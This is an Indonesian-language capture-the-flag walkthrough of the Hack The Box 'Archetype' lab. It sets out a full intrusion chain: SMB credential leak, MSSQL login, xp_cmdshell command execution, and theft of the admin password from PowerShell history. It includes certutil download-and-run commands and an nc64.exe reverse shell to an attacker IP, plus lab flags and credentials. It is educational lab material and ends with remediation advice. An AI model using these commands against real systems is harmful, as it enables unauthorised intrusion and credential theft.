# HTB — Archetype | Full Walkthrough (Lengkap, Langkah demi Langkah)

> Dokumentasi lengkap: setiap perintah + output asli + penjelasan "kenapa".
> Untuk tujuan edukasi / lab resmi Hack The Box.

---

## 📋 Informasi Box

| Item | Nilai |
|------|-------|
| Nama Box | **Archetype** |
| Target IP | `10.129.95.187` |
| OS | Windows Server 2019 Standard (Build 17763) |
| Difficulty | Very Easy |
| Hostname | `ARCHETYPE` |
| Workgroup | WORKGROUP |
| Database | Microsoft SQL Server 2017 (14.00.1000) |

### Flags
| Flag | Value |
|------|-------|
| **user.txt** | `3e7b102e78218e935bf3f4951fec21a3` |
| **root.txt** | `b91ccec3305e98240082d4474b848528` |

### Prasyarat
```bash
# 1. Connect ke HTB VPN (openvpn)
sudo openvpn your-htb.ovpn

# 2. (opsional) tambahkan hostname ke /etc/hosts
echo "10.129.95.187 archetype.htb" | sudo tee -a /etc/hosts

# 3. Cek konektivitas
ping -c 2 10.129.95.187
```

### Tool yang dipakai
`nmap`, `smbclient`, `smbmap`, `impacket` (`mssqlclient.py`, `wmiexec.py`), `evil-winrm`, `netcat`.

---

## 🗺️ Peta Serangan (Big Picture)

```
[Recon]  nmap -p-  →  MSSQL di 1433, SMB di 445, WinRM di 5985
   │
   ▼
[SMB]  share 'backups' (READ anonim)  →  prod.dtsConfig
   │        └─► kredensial:  sql_svc : M3g4c0rp123
   ▼
[MSSQL]  mssqlclient.py -windows-auth  (login sql_svc)
   │
   ▼
[RCE]  xp_cmdshell  →  eksekusi perintah Windows sebagai sql_svc
   │
   ▼
[Privesc]  winPEAS / enum manual  →  ConsoleHost_history.txt
   │        └─► kredensial:  administrator : MEGACORP_4dm1n!!
   ▼
[Flags]  evil-winrm / wmiexec  →  user.txt + root.txt
```

---

# LANGKAH 1 — Reconnaissance (Nmap)

### 1.1 Scan cepat (top ports) untuk gambaran awal
```bash
nmap -Pn -sV -T4 10.129.95.187
```

### 1.2 Full TCP port scan (WAJIB supaya jangan kelewat port)
```bash
nmap -Pn -p- -T4 --max-retries 2 --min-rate 800 -oN nmap_allports.txt 10.129.95.187
```

**Output:**
```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

### 1.3 Deteksi versi service + script default
```bash
nmap -Pn -sV -sC -p 135,139,445,1433,5985,47001 10.129.95.187
```

**Output penting:**
```
PORT     STATE SERVICE       VERSION
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   Workgroup: WORKGROUP
| smb2-security-mode:
|   3.1.1: Message signing enabled but not required
```

### 🧠 Analisis
| Port | Service | Arti |
|------|---------|------|
| 445 | SMB | cek share — sering ada file bocor |
| **1433** | **MSSQL** | **server database** ← jawaban quiz |
| 5985 | WinRM | jalur login admin (kalau punya kredensial) |
| 135 / 49664-69 | RPC | internal Windows |

> ⚠️ **PITFALL PENTING:** Scan awal saya pakai `--min-rate 2000 --max-retries 1`
> dan **port 1433 TIDAK muncul** (kena *retransmission cap* → port di-skip diam-diam).
> Setelah re-scan dengan `--max-retries 2`, 1433 baru kelihatan.
> **Selalu** pakai `--max-retries 2` atau lebih, atau `-T4` default.

✅ **Quiz:** Port TCP yang menjalankan server database = **`1433`** (Microsoft SQL Server).

---

# LANGKAH 2 — Enumerasi SMB (Port 445)

### 2.1 Daftar share + hak akses
```bash
nmap -Pn -p 445 --script smb-enum-shares 10.129.95.187
# atau
smbclient -N -L //10.129.95.187
# atau
smbmap -H 10.129.95.187
```

**Output (nmap smb-enum-shares):**
```
| smb-enum-shares:
|   account_used: guest
|   \\10.129.95.187\ADMIN$:      Remote Admin        Anonymous access: <none>
|   \\10.129.95.187\C$:          Default share       Anonymous access: <none>
|   \\10.129.95.187\IPC$:        Remote IPC          Anonymous access: READ/WRITE
|   \\10.129.95.187\backups:                         Anonymous access: READ
```

**Output (smbclient -N -L):**
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```

### 🧠 Analisis
- `ADMIN$`, `C$`, `IPC$` → **share administratif** (hidden, ada `$`, hak admin).
- **`backups`** → **share non-administratif**, dan bisa diakses **anonim/guest (READ)**.
  Ini target kita.

✅ **Quiz:** Share non-Administratif = **`backups`**.

### 2.2 Masuk share & lihat isi
```bash
smbclient -N //10.129.95.187/backups
smb: \> ls
smb: \> get prod.dtsConfig
smb: \> exit
```

**Output listing:**
```
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
```

### 2.3 Baca file yang didownload
```bash
cat prod.dtsConfig
```

**Output:**
```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." .../>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property"
                   Path="\Package.Connections[Destination].Properties[ConnectionString]"
                   ValueType="String">
        <ConfiguredValue>Data Source=.;
            Password=M3g4c0rp123;
            User ID=ARCHETYPE\sql_svc;
            Initial Catalog=Catalog;
            Provider=SQLNCLI10.1;
            Persist Security Info=True;
            Auto Translate=False;
        </ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

### 🧠 Analisis
- `prod.dtsConfig` adalah file konfigurasi **SSIS/DTS** yang menyimpan **connection string** ke MSSQL.
- Password tersimpan **plaintext** di dalamnya.
- **Konsep:** *Sensitive data exposure* — file backup/config berisi kredensial di share SMB yang bisa dibaca guest.

✅ **Quiz:** Kata sandi yang teridentifikasi = **`M3g4c0rp123`**.

**Kredensial didapat:**
| User | Password |
|------|----------|
| `ARCHETYPE\sql_svc` | `M3g4c0rp123` |

---

# LANGKAH 3 — Akses MSSQL (Port 1433)

### 3.1 Tool: Impacket `mssqlclient.py`
Script Impacket untuk koneksi MSSQL terautentikasi = **`mssqlclient.py`**
(perintah sistem: `impacket-mssqlclient`).

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
```

**Output (login sukses):**
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

### 3.2 Verifikasi versi
```sql
SELECT @@version;
```
**Output:**
```
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64)
    Aug 22 2017 17:04:49
    Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763)
```

### 🧠 Analisis parameter
| Parameter | Arti |
|-----------|------|
| `ARCHETYPE/sql_svc` | domain/user (`ARCHETYPE\sql_svc`) |
| `:M3g4c0rp123` | password (dari `prod.dtsConfig`) |
| `@10.129.95.187` | host target |
| `-windows-auth` | **Windows Authentication** — wajib, karena `sql_svc` akun domain, bukan SQL login native |

✅ **Quiz:** Script Impacket untuk koneksi MSSQL = **`mssqlclient.py`**.

---

# LANGKAH 4 — Remote Code Execution via xp_cmdshell

### 4.1 Konsep
`xp_cmdshell` = **extended stored procedure** MSSQL yang menjalankan perintah OS (cmd.exe)
dengan hak akun service SQL Server. Jika aktif → **RCE**.

### 4.2 Aktifkan & jalankan perintah
```sql
-- 1. izinkan perubahan opsi lanjutan
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;

-- 2. aktifkan xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 3. jalankan perintah OS
EXEC xp_cmdshell 'whoami';
```

**Output:**
```
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

output
-----------------
archetype\sql_svc
NULL
```

### 🧠 Analisis
Kita sudah bisa menjalankan perintah Windows sebagai **`archetype\sql_svc`** → RCE tercapai.

✅ **Quiz:** Extended stored procedure untuk menjalankan shell perintah Windows = **`xp_cmdshell`**.

### 4.3 (Opsional) Jalankan perintah satu baris non-interaktif
```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth \
  -command "EXEC xp_cmdshell 'whoami'"
```

### 4.4 (Opsional) Reverse shell stabil
Upload `nc64.exe` ke target lalu connect balik.
```sql
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.5/nc64.exe C:\Users\sql_svc\Downloads\nc64.exe';
EXEC xp_cmdshell 'C:\Users\sql_svc\Downloads\nc64.exe -e cmd.exe 10.10.14.5 9001';
```
Di attacker:
```bash
# taruh nc64.exe di folder yang di-serve
python3 -m http.server 80
# listener
nc -lvnp 9001
```

---

# LANGKAH 5 — Privilege Escalation

### 5.1 Tool enumerasi privesc Windows
Script = **`winPEAS`** (varian `winPEASx64.exe` / `winPEAS.bat`).
Alternatif: `PowerUp.ps1` (PowerSploit), `SharpUp.exe`, `Seatbelt.exe`.

```sql
-- download winPEASx64.exe dari attacker lalu jalankan
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.5/winPEASx64.exe C:\Users\sql_svc\Downloads\winPEASx64.exe';
EXEC xp_cmdshell 'C:\Users\sql_svc\Downloads\winPEASx64.exe';
```

### 5.2 Enum manual cepat (tanpa upload tool) — inilah yang menemukan jalur
```sql
-- cek privilege token
EXEC xp_cmdshell 'whoami /priv';

-- lihat isi Desktop user
EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop';

-- baca PowerShell command history
EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt';
```

**Output 1 — `whoami /priv`:**
```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**Output 2 — Desktop:**
```
 Directory of C:\Users\sql_svc\Desktop
02/25/2020  07:37 AM                32 user.txt
```

**Output 3 — `ConsoleHost_history.txt`:**
```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

### 🧠 Analisis
1. **`SeImpersonatePrivilege` = Enabled** → jalur privesc klasik
   (PrintSpoofer / JuicyPotato / GodPotato) untuk naik ke **NT AUTHORITY\SYSTEM**.
2. **Lebih mudah:** file **`ConsoleHost_history.txt`** (riwayat PowerShell `sql_svc`)
   membocorkan perintah yang mengetik password admin di command line → **plaintext**:
   `administrator : MEGACORP_4dm1n!!`

✅ **Quiz:**
- Skrip privesc = **`winPEAS`**
- File berisi kata sandi administrator = **`ConsoleHost_history.txt`**
- (Password: **`MEGACORP_4dm1n!!`**)

**Kredensial didapat:**
| User | Password |
|------|----------|
| `administrator` | `MEGACORP_4dm1n!!` |

---

# LANGKAH 6 — Ambil Flags sebagai Administrator

### 6.1 Login sebagai Administrator (WinRM / port 5985)
```bash
evil-winrm -i 10.129.95.187 -u administrator -p 'MEGACORP_4dm1n!!'
```

### 6.2 Atau non-interaktif via Impacket wmiexec
```bash
impacket-wmiexec administrator:'MEGACORP_4dm1n!!'@10.129.95.187 'type C:\Users\sql_svc\Desktop\user.txt'
impacket-wmiexec administrator:'MEGACORP_4dm1n!!'@10.129.95.187 'type C:\Users\Administrator\Desktop\root.txt'
```

**Output:**
```
=== user.txt ===
3e7b102e78218e935bf3f4951fec21a3

=== root.txt ===
b91ccec3305e98240082d4474b848528
```

### 🏁 FLAGS
```
user.txt : 3e7b102e78218e935bf3f4951fec21a3
root.txt : b91ccec3305e98240082d4474b848528
```

---

# ✅ Ringkasan Jawaban Quiz

| # | Pertanyaan | Jawaban |
|---|-----------|---------|
| 1 | Port TCP yang menjalankan server database? | **1433** (Microsoft SQL Server 2017) |
| 2 | Bagian non-Administratif yang tersedia di SMB? | **`backups`** |
| 3 | Kata sandi dalam file di share SMB? | **`M3g4c0rp123`** |
| 4 | Script Impacket untuk koneksi MSSQL? | **`mssqlclient.py`** |
| 5 | Extended stored procedure untuk shell Windows? | **`xp_cmdshell`** |
| 6 | Skrip pencari jalur privesc Windows? | **`winPEAS`** |
| 7 | File berisi kata sandi administrator? | **`ConsoleHost_history.txt`** |

---

# 🔑 Kredensial

| User | Password |
|------|----------|
| `sql_svc` | `M3g4c0rp123` |
| `administrator` | `MEGACORP_4dm1n!!` |

---

# 📜 Semua Perintah (Cheat Sheet)

```bash
# --- 1. RECON ---
nmap -Pn -p- -T4 --max-retries 2 --min-rate 800 10.129.95.187
nmap -Pn -sV -sC -p 135,139,445,1433,5985,47001 10.129.95.187

# --- 2. SMB ---
nmap -Pn -p 445 --script smb-enum-shares 10.129.95.187
smbclient -N -L //10.129.95.187
smbclient -N //10.129.95.187/backups -c "ls"
smbclient -N //10.129.95.187/backups -c "get prod.dtsConfig"
cat prod.dtsConfig

# --- 3. MSSQL ---
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth

# --- 4. RCE (di dalam mssqlclient) ---
# EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
# EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
# EXEC xp_cmdshell 'whoami';

# --- 5. PRIVESC ---
# EXEC xp_cmdshell 'whoami /priv';
# EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt';

# --- 6. FLAGS ---
evil-winrm -i 10.129.95.187 -u administrator -p 'MEGACORP_4dm1n!!'
impacket-wmiexec administrator:'MEGACORP_4dm1n!!'@10.129.95.187 'type C:\Users\Administrator\Desktop\root.txt'
```

---

# 🛡️ Remediation (Catatan Defensif)

1. **Jangan simpan kredensial plaintext** di file config (`.dtsConfig`, `web.config`, dll). Pakai secret manager / DPAPI.
2. **Batasi share SMB** — jangan izinkan anonymous/guest READ ke folder berisi data sensitif.
3. **Least privilege** untuk akun service MSSQL — jangan beri `sysadmin` yang bisa `xp_cmdshell`.
4. **Nonaktifkan `xp_cmdshell`** bila tak dipakai:
   `EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;`
5. **Batasi WinRM** (5985/5986) hanya untuk admin berhak; jangan expose ke jaringan luas.
6. **Bersihkan history** sensitif & jangan ketik password di command line (bocor ke history + process list).
   Hapus `ConsoleHost_history.txt` / nonaktifkan PSReadline history.
7. **Audit `SeImpersonatePrivilege`** — hindari memberikannya ke service account bila tak perlu.
8. **Rotasi password** yang pernah bocor; gunakan password unik per akun.

---

*Ditulis sebagai dokumentasi edukasi. Target adalah lab resmi Hack The Box.*
